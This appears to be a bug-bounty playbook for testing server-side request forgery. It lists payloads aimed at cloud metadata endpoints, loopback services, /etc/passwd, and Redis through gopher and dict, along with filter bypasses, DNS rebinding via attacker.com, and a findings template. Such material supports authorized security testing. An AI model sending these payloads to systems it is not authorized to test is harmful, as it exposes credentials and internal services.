# SSRF Testing Playbook

## Overview
Server-Side Request Forgery — forcing the server to make requests to internal/external resources.

## Testing Approach

### 1. Identify Request Points
- URL parameters (`?url=`, `?src=`, `?dest=`)
- File upload with URL preview
- Webhook integrations
- Image/avatar URL parameters
- PDF generation with URL parameter

### 2. Basic SSRF Tests

**Internal IPs**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Internal Services**
```
http://169.254.169.254/  (AWS metadata)
http://metadata.google.internal/ (GCP)
http://192.168.1.1/
http://10.0.0.1/
```

**File Access**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Protocol Smuggling
```
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_INFO
sftp://127.0.0.1:22/
```

## Common SSRF Locations

| Feature | Parameter Examples |
|---------|-------------------|
| URL previews | `url`, `src`, `link`, `target` |
| Image resizing | `image_url`, `thumbnail`, `avatar_url` |
| Webhooks | `webhook_url`, `callback_url` |
| PDF export | `export_url`, `pdf_url` |
| File fetch | `fetch_url`, `load_url` |

## Testing Workflow

1. **Find request parameters** — look for URL-fetching features
2. **Test basic SSRF** — point to controlled server
3. **Probe internal** — try localhost, 169.254, internal IPs
4. **Check for filter bypass** — URL encoding, redirection
5. **Escalate** — try to access metadata, databases, internal APIs

## Bypass Techniques

### URL Parsing Confusion
```
http://example.com@127.0.0.1
http://127.0.0.1#@example.com
http://127.0.0.1?@example.com
```

### DNS Rebinding
```
http://attacker.com (points to 127.0.0.1 at time of request)
```

### Protocol Smuggling
```
http://127.0.0.1:6379/_INFO (Redis)
http://127.0.0.1:11211/stats (Memcached)
```

### Open Redirection Chaining
```
http://target.com/redirect?url=http://internal
```

## Findings Format

```
## SSRF Finding
- **URL**: https://target.com/fetch
- **Parameter**: url
- **Tested Payload**: http://127.0.0.1:6379/
- **Response**: Connection refused / Data returned
- **Internal Access**: Yes (AWS metadata) / No
- **Impact**: Internal service enumeration / Data exfiltration
```

## Files to Update
After finding SSRF, write to:
```
~/Shared/bounty_recon/{program}/ghost/skills/ssrf/findings.md
```

Include: endpoint, parameter, payloads tested, what was accessed, internal services probed.
